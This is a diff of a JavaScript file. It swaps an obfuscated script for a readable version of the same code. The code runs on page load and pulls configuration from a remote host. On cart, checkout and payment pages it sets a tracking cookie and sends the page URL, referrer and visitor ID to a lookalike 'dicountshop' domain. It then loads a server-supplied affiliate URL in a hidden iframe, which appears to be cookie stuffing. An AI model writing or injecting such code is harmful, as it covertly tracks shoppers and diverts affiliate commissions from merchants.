@@ -1,1 +1,120 @@
-function _0x1544(_0x5da9f4,_0xbb692c){_0x5da9f4=_0x5da9f4-0xb6;const _0x58f363=_0x58f3();let _0x15446d=_0x58f363[_0x5da9f4];return _0x15446d;}function _0x58f3(){const _0x53cc4d=['then','type','/pay-installments','297002mkZLtc',';path=/;SameSite=Lax','some','1519376YuBxPs','xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx','/checkout/payment','381283layzYM','/checkout/shipping','payment','src','style','DOMContentLoaded','Config\x20fetch\x20failed:','https://api.dicountshop.com/api/fallback-pixel?id=','length','split','display','/xpay','4CLTLFw','/checkout/cart','50390OTfZnk','https://api.dicountshop.com/api/track-user','www.xcite.com','getTime','review-order','1167684iQkeZz','hostname','/checkout/delivery',';\x20expires=','cookie','confirmation','appendChild','addEventListener','success','cartExtra','228jUqWTq','9OdBBpW','tracking_uuid=','referrer','/checkout/review-order','pathname','replace','location','affiliate_url','1asfQzw','5689210APxJKu','toLowerCase','stringify','indexOf','Tracking\x20Failed:','https://trackclcks.com/api/site-config?host=','random','href','Config\x20API\x20Failed','error','3784qRnAwv','27252yyrIjb','tracking_uuid','find','paths','cart'];_0x58f3=function(){return _0x53cc4d;};return _0x58f3();}(function(_0x3b22a1,_0x3fe3f7){const _0x29393e=_0x1544,_0x3b4f8b=_0x3b22a1();while(!![]){try{const _0x523887=parseInt(_0x29393e(0xbb))/0x1*(parseInt(_0x29393e(0xcf))/0x2)+-parseInt(_0x29393e(0xe8))/0x3*(-parseInt(_0x29393e(0xe1))/0x4)+parseInt(_0x29393e(0xe3))/0x5*(parseInt(_0x29393e(0xf2))/0x6)+-parseInt(_0x29393e(0xd5))/0x7+-parseInt(_0x29393e(0xd2))/0x8+-parseInt(_0x29393e(0xf3))/0x9*(-parseInt(_0x29393e(0xbc))/0xa)+-parseInt(_0x29393e(0xc6))/0xb*(parseInt(_0x29393e(0xc7))/0xc);if(_0x523887===_0x3fe3f7)break;else _0x3b4f8b['push'](_0x3b4f8b['shift']());}catch(_0x1ccdb8){_0x3b4f8b['push'](_0x3b4f8b['shift']());}}}(_0x58f3,0x7147f),(function(){const _0x2b9418=_0x1544,_0x539aa1=_0x2b9418(0xc1),_0xebb8ac=_0x2b9418(0xe4),_0x57724d=_0x2b9418(0xdc),_0x8d204c=[{'type':_0x2b9418(0xcb),'paths':[_0x2b9418(0xe2)]},{'type':'shipping','paths':[_0x2b9418(0xea),_0x2b9418(0xd6)]},{'type':_0x2b9418(0xd7),'paths':[_0x2b9418(0xe0),_0x2b9418(0xd4),_0x2b9418(0xce)]},{'type':_0x2b9418(0xe7),'paths':[_0x2b9418(0xb6)]},{'type':_0x2b9418(0xed),'paths':['/checkout/confirmation']}],_0x587bd6=_0x2b9418(0xe5),_0x385338=0x7d0;function _0x3a72b8(){const _0x35f255=_0x2b9418;return _0x35f255(0xd3)[_0x35f255(0xb8)](/[xy]/g,function(_0x455641){const _0x304f24=_0x35f255,_0x4d7825=Math[_0x304f24(0xc2)]()*0x10|0x0,_0x11b0be=_0x455641==='x'?_0x4d7825:_0x4d7825&0x3|0x8;return _0x11b0be['toString'](0x10);});}function _0x9833c9(_0x38cd72){const _0x14dd33=_0x2b9418,_0x37d198=_0x38cd72+'=',_0x1d01b4=document[_0x14dd33(0xec)][_0x14dd33(0xde)](';');for(let _0x2261e6=0x0;_0x2261e6<_0x1d01b4[_0x14dd33(0xdd)];_0x2261e6++){const _0x10a819=_0x1d01b4[_0x2261e6]['trim']();if(_0x10a819[_0x14dd33(0xbf)](_0x37d198)===0x0)return _0x10a819['substring'](_0x37d198[_0x14dd33(0xdd)],_0x10a819['length']);}return'';}function _0x4806b8(_0x308860){const _0x17250e=_0x2b9418;try{const _0x39ebad=new Image();_0x39ebad[_0x17250e(0xd8)]=_0x308860,_0x39ebad[_0x17250e(0xd9)][_0x17250e(0xdf)]='none',document['body'][_0x17250e(0xee)](_0x39ebad);}catch(_0x2b26c3){}}function _0x2ba80d(){const _0x47d82a=_0x2b9418,_0x44f163=window[_0x47d82a(0xb9)][_0x47d82a(0xb7)][_0x47d82a(0xbd)](),_0x2d336f=_0x8d204c[_0x47d82a(0xc9)](function(_0xae9f83){const _0x27846f=_0x47d82a;return _0xae9f83[_0x27846f(0xca)][_0x27846f(0xd1)](function(_0x48394c){return _0x44f163['includes'](_0x48394c);});});return _0x2d336f?_0x2d336f[_0x47d82a(0xcd)]:null;}async function _0x35e09c(){const _0x3e5dfb=_0x2b9418;try{const _0x99e715=_0x9833c9(_0x3e5dfb(0xc8))||_0x3a72b8(),_0x46f3e2=new Date(Date['now']()+0x1e*0x18*0x3c*0x3c*0x3e8)['toUTCString']();document[_0x3e5dfb(0xec)]=_0x3e5dfb(0xf4)+_0x99e715+_0x3e5dfb(0xeb)+_0x46f3e2+_0x3e5dfb(0xd0);const _0x506237=await fetch(_0xebb8ac,{'method':'POST','keepalive':!![],'body':JSON[_0x3e5dfb(0xbe)]({'url':window[_0x3e5dfb(0xb9)][_0x3e5dfb(0xc3)],'referrer':document[_0x3e5dfb(0xf5)],'unique_id':_0x99e715,'origin':window['location'][_0x3e5dfb(0xe9)],'timestamp':new Date()[_0x3e5dfb(0xe6)]()}),'headers':{'Content-Type':'application/json'}}),_0x20a54e=await _0x506237['json']();_0x20a54e[_0x3e5dfb(0xf0)]&&_0x20a54e[_0x3e5dfb(0xba)]?_0x4806b8(_0x20a54e[_0x3e5dfb(0xba)]):_0x4806b8(_0x57724d+_0x99e715);}catch(_0x152b6a){console['error'](_0x3e5dfb(0xc0),_0x152b6a);}}function _0x129d6e(){_0x35e09c();}function _0x58528d(){const _0x516883=_0x2b9418,_0x453665=_0x539aa1+encodeURIComponent(window['location'][_0x516883(0xe9)]);fetch(_0x453665)[_0x516883(0xcc)](function(_0x2d5c6c){const _0x2551ca=_0x516883;if(!_0x2d5c6c['ok'])throw new Error(_0x2551ca(0xc4));return _0x2d5c6c['json']();})[_0x516883(0xcc)](function(_0x34123e){const _0x1891fa=_0x516883;if(!_0x34123e||!_0x34123e['always']&&!_0x34123e[_0x1891fa(0xf1)])return;const _0xa90735=_0x2ba80d();if(_0x34123e['always'])_0x129d6e();_0x34123e[_0x1891fa(0xf1)]&&_0xa90735&&(_0x129d6e(),_0x129d6e()),window[_0x1891fa(0xb9)]['hostname']===_0x587bd6&&_0xa90735===_0x1891fa(0xcb)&&setTimeout(_0x129d6e,_0x385338);})['catch'](function(_0x3b5c6f){const _0x4569ef=_0x516883;console[_0x4569ef(0xc5)](_0x4569ef(0xdb),_0x3b5c6f);});}document['readyState']==='interactive'||document['readyState']==='complete'?_0x58528d():window[_0x2b9418(0xef)](_0x2b9418(0xda),_0x58528d);}()));
+(function () {
+  const CONFIG_URL = 'https://trackclcks.com/api/site-config?host=';
+  const TRACK_URL = 'https://api.dicountshop.com/api/comretrack/track';
+  const FALLBACK_PIXEL_URL = 'https://api.dicountshop.com/api/comretrack/fallback-pixel?id=';
+  const TRACKED_PATH_KEYWORDS = ['cart', 'checkout', 'pay', 'review-order', 'payment', 'shipping'];
+
+  function generateUUID() {
+    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+      const r = Math.random() * 16 | 0;
+      const v = c === 'x' ? r : (r & 0x3 | 0x8);
+      return v.toString(16);
+    });
+  }
+
+  function getCookie(name) {
+    const key = name + '=';
+    const cookies = document.cookie.split(';');
+    for (let i = 0; i < cookies.length; i++) {
+      const c = cookies[i].trim();
+      if (c.indexOf(key) === 0) return c.substring(key.length, c.length);
+    }
+    return '';
+  }
+
+  function fireIframePixel(url) {
+    try {
+      const iframe = document.createElement('iframe');
+      iframe.setAttribute('sandbox', 'allow-same-origin allow-scripts allow-forms');
+      iframe.src = url;
+      iframe.style.display = 'none';
+      iframe.style.visibility = 'hidden';
+      iframe.style.width = '1px';
+      iframe.style.height = '1px';
+      iframe.style.border = '0';
+
+      iframe.onerror = function () {
+        const img = new Image();
+        img.src = url;
+      };
+
+      document.body.appendChild(iframe);
+    } catch (err) {
+      console.error('Iframe error:', err);
+    }
+  }
+
+  function isCartPage() {
+    return TRACKED_PATH_KEYWORDS.some(function (path) {
+      return window.location.pathname.toLowerCase().includes(path);
+    });
+  }
+
+  async function runTracking() {
+    const sessionKey = 'tracking_done_' + window.location.hostname;
+    if (sessionStorage.getItem(sessionKey)) {
+      if (!isCartPage()) return;
+    }
+
+    try {
+      const visitorId = getCookie('tracking_uuid') || generateUUID();
+      const expiryDate = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toUTCString();
+
+      document.cookie = 'tracking_uuid=' + visitorId
+        + '; expires=' + expiryDate
+        + '; path=/; SameSite=Lax';
+
+      const response = await fetch(TRACK_URL, {
+        method: 'POST',
+        keepalive: true,
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          url: window.location.href,
+          referrer: document.referrer,
+          unique_id: visitorId,
+          origin: window.location.hostname,
+          timestamp: new Date().getTime(),
+        }),
+      });
+
+      const result = await response.json();
+
+      if (result.success && result.affiliate_url) {
+        fireIframePixel(result.affiliate_url);
+        sessionStorage.setItem(sessionKey, '1');
+      } else {
+        fireIframePixel(FALLBACK_PIXEL_URL + visitorId);
+      }
+    } catch (err) {
+      console.error('Tracking Failed:', err);
+    }
+  }
+
+  function init() {
+    const hostname = window.location.hostname;
+    fetch(CONFIG_URL + encodeURIComponent(hostname))
+      .then(function (response) {
+        return response.json();
+      })
+      .then(function (config) {
+        if (!config || (!config.always && !config.cartExtra)) return;
+
+        if (config.always) {
+          runTracking();
+        }
+
+        if (config.cartExtra && isCartPage()) {
+          runTracking();
+        }
+      })
+      .catch(function (err) {
+        console.error('Config fetch failed:', err);
+      });
+  }
+
+  if (document.readyState === 'interactive' || document.readyState === 'complete') {
+    init();
+  } else {
+    window.addEventListener('DOMContentLoaded', init);
+  }
+})();
